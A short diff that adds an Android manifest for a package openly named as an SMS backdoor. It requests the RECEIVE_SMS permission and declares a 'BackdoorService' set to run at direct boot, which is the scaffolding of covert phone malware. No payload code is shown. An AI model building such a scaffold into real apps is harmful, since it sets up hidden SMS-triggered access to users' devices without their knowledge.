@@ -1,0 +1,7 @@
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.evilthreads.smsbackdoor">
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <application>
+        <service android:name=".BackdoorService" android:directBootAware="true"/>
+    </application>
+</manifest>
